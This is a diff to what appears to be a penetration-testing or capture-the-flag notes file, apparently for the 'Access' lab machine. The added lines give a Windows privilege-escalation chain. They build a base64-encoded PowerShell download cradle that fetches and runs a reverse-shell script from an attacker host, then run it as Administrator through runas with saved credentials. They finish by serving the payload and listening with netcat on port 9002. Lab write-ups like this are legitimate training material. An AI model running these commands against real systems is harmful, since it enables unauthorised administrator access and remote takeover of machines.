@@ -188,15 +188,22 @@ $WScript.CreateShortcut($shortcut)
 
 runas /user:ACCESS\Administrator /savecred "whoami > C:/Users/Public/Desktop/test"
 
-1. Encoded PowerShell
-===================
+1. Encoded PowerShell ( cp Invoke-PowerShellTcp.ps1 9002.ps1 )
+===================================================================
 echo -n "IEX(New-Object Net.WebClient).downloadString('http://X.X.X.X:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w 0
 
 Result => XxxxXxxXxxXXXxxxxXxxxx=
 
 2. Run Encoded Command
-====================
-runas /user:ACCESS\Administrator /savecred "Powershell -EncodedCommand XxxxXxxXxxXXXxxxxXxxxx="
+======================
+
+runas /user:ACCESS\Administrator /savecred "Powershell -EncodedCommand XxxxXxxXxxXXXxxxxXxxxx=" 
+
+3. Reverse TCP Connection on KALI
+=================================
+python -m SimpleHTTPServer 
+
+nc -nvlp 9002
 
 
 
